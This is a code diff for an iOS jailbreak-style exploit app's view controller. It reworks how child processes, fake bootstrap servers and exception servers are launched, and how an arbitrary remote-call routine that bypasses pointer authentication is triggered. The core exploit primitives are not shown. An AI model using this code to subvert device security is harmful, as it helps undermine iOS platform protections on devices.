@@ -14,7 +14,6 @@
 extern _Atomic bool global_found;
 extern _Atomic uint64_t global_result_ptr;
 extern _Atomic uint32_t global_result_diversifier;
-
 extern mach_port_t setup_exception_server_with_id(int thread_id);
 
 #include <Security/SecKey.h>
@@ -54,7 +53,11 @@ NSDictionary *getLaunchdStringOffsets(void) {
 
 @interface ViewController ()
 // @property(nonatomic) mach_port_t exceptionPort;
-// @property(nonatomic) mach_port_t fakeBootstrapPort;
+@property(nonatomic) mach_port_t fakeBootstrapPort;
+@property(nonatomic) pid_t *childPids;
+@property(nonatomic) int childPidCount;
+@property(nonatomic) int cpuCount;
+@property(nonatomic) BOOL serversInitialized;
 @end
 
 BOOL gTweakEnabled=YES;
@@ -81,6 +84,18 @@ BOOL gTweakEnabled=YES;
     ]];
     
     [vc didMoveToParentViewController:self];
+    // Initialize process tracking and server state
+    int mib[2] = {CTL_HW, HW_NCPU};
+    int cpu_count = 1;
+    size_t len = sizeof(cpu_count);
+    sysctl(mib, 2, &cpu_count, &len, NULL, 0);
+    if (cpu_count < 1) cpu_count = 1;
+    if (cpu_count > 8) cpu_count = 8; // Limit to max 8 threads
+
+    self.cpuCount = cpu_count;
+    self.childPidCount = 0;
+    self.serversInitialized = NO;
+    self.childPids = calloc(cpu_count, sizeof(pid_t));
     // find launchd string offsets
     NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
     if (!defaults.offsetLaunchdPath) {
@@ -93,28 +108,42 @@ BOOL gTweakEnabled=YES;
             NSLog(@"Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
         }
     }
-    int mib[2] = {CTL_HW, HW_NCPU};
-    int cpu_count = 1;
-    size_t len = sizeof(cpu_count);
-    sysctl(mib, 2, &cpu_count, &len, NULL, 0);
-    if (cpu_count < 1) cpu_count = 1;
-    for (int i = 0; i < cpu_count; i++) {
-      launchTestWithThread(@"dtsecurity", i);
+
+    bool serversExist = false;
+    for (int i = 0; i < self.cpuCount; i++) {
+        if (check_exception_server_exists(i)) {
+            serversExist = true;
+            break;
+        }
     }
-    for (int i = 0; i < cpu_count; i++) {
+
+    self.fakeBootstrapPort = setup_fake_bootstrap_server();
+    for (int i = 0; i < self.cpuCount; i++) {
       setup_exception_server_with_id(i);
-      setup_fake_bootstrap_server_with_id(i);
+          self.childPids[i] = launchTestWithThread(@"dtsecurity", i);
+            if (self.childPids[i] > 0) {
+              self.childPidCount++;
+              NSLog(@"child process %d with pid %d\n", i, self.childPids[i]);
+            } else {
+              NSLog(@"launch child process fail %d\n", i);
+            }
+
     }
+    self.serversInitialized = YES;
 
-
-
-}
+    }
 // void testButtonTapped() {
 //   launchTest(@"dtsecurity");
 //   NSLog(@"launch dtsecurity");
 // }
 
-void arbCallButtonTapped() {
+- (void)arbCallButtonTapped
+{
+    [self arbCallButtonTappedFromSwiftUI];
+}
+
+- (void)arbCallButtonTappedFromSwiftUI
+{
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
 
         kern_return_t kr;
@@ -127,13 +156,11 @@ void arbCallButtonTapped() {
 
         NSLog(@"init bruteforce %d threads\n", cpu_count);
 
-        
-        force_crash(); 
-        while (!global_found) {
-            usleep(50000);
-        }
+                // while (!global_found) {
+        //     usleep(50000);
+        // }
 
-        NSLog(@"pac ret ptr=0x%llx, div=0x%x\n", global_result_ptr, global_result_diversifier);
+        // NSLog(@"pac ret ptr=0x%llx, div=0x%x\n", global_result_ptr, global_result_diversifier);
 
         vm_size_t page_size = getpagesize();
         vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
@@ -370,6 +397,21 @@ void initFromSwiftUI()
         {
             [AppDelegate showMesage:Localized(@"It seems that you have the Filza installed in trollstore, which may be detected as jailbroken. You can remove it from trollstore then install Filza from roothide repo in Sileo.") title:Localized(@"Warning")];
         }
+    }
+}
+
+- (void)dealloc {
+    if (self.childPids) {
+        NSLog(@"Cleaning up %d child processes\n", self.childPidCount);
+        kill_child_processes(self.childPids, self.cpuCount);
+        free(self.childPids);
+        self.childPids = NULL;
+    }
+
+    if (self.serversInitialized) {
+        NSLog(@"Cleaning up bootstrap servers\n");
+        cleanup_bootstrap_servers(self.cpuCount);
+        self.serversInitialized = NO;
     }
 }
 
